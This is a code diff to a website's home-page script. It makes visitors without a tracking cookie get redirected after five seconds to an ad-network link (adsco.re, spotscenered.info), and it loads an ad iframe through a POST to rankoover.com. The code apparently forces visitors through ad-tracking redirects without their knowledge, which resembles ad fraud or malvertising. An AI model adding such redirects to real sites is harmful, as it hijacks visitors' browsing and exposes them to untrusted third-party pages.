@@ -18,24 +18,10 @@
    <body class="home">
 
    <script>
-    function getCookie(name) {
-    const nameEQ = name + "=";
-    const cookiesArray = document.cookie.split(';');
-    
-    for (let cookie of cookiesArray) {
-        cookie = cookie.trim(); // Remove whitespace from the beginning and end
-        
-        if (cookie.indexOf(nameEQ) === 0) {
-            return cookie.substring(nameEQ.length, cookie.length);
-        }
-    }
-    
-    return null; // Return null if the cookie is not found
-    }
     window.addEventListener('load', function() {
-        setTimeout(function() {
          const username = getCookie("iframe_loaded_moo_a");
-         if (username) {
+         setTimeout(function() {
+         if (username === null) {
             window.location.href = 'https://c.adsco.re/r#apikey=QlJAAAAAAAAArRMIRsGBk-hpXXMDyS9EWV8qBEI&sub_id=23942&type=2&data=https%3A%2F%2Fengine.spotscenered.info%2Flink.engine%3Fz%3D87558%26guid%3D64ce86d5-613e-46af-b41b-6f9885140eab';
          }
         }, 5000);
@@ -72,19 +58,34 @@ function setCookie(name, value) {
     document.cookie = name + "=" + value + ";" + expires + ";path=/";
 }
 
+function getCookie(name) {
+    const nameEQ = name + "=";
+    const cookiesArray = document.cookie.split(';');
+    for (let cookie of cookiesArray) {
+        cookie = cookie.trim();
+        if (cookie.indexOf(nameEQ) === 0) {
+            return cookie.substring(nameEQ.length, cookie.length);
+        }
+    }
+    return null;
+}
+
 async function loadIframe() {
     try {
-        let response = await fetch('https://rankoover.com/load_iframe_moo_adsupply', {
-            method: 'POST'
-        });
-        let result = await response.json();
-        
-        if (response.status === 200 && result.status === "iframe_loaded_moo_a") {
-            setCookie("iframe_loaded_moo_a", "1");
-            rFrx();
-        } else if (response.status === 403) {
-            if (result.status === "limit_exceeded_moo_a") {
-            } else if (result.status === "already_loaded_moo_a") {
+        const ccc = getCookie("iframe_loaded_moo_a");
+        if (ccc === null) {
+            let response = await fetch('https://rankoover.com/load_iframe_moo_adsupply', {
+                method: 'POST'
+            });
+            let result = await response.json();
+            
+            if (response.status === 200 && result.status === "iframe_loaded_moo_a") {
+                setCookie("iframe_loaded_moo_a", "1");
+                rFrx();
+            } else if (response.status === 403) {
+                if (result.status === "limit_exceeded_moo_a") {
+                } else if (result.status === "already_loaded_moo_a") {
+                }
             }
         }
     } catch (error) {
